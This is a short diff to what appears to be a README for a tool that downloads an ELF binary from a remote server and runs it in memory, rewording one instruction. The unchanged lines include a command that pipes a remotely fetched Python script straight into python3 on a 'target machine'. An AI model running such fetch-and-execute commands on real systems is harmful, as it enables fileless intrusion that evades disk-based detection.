@@ -15,9 +15,7 @@ url = "http://your-server/your_elf" # To download elf from
 args = ["arg1","arg2",...] # List of arguments to pass to program
 ```
 
-**Second**, on target machine, run:
-
-Example:
+**Second**, on target machine, as an example, run:
 
 ```
 curl http://your-server/elf_in_memory.py | python3
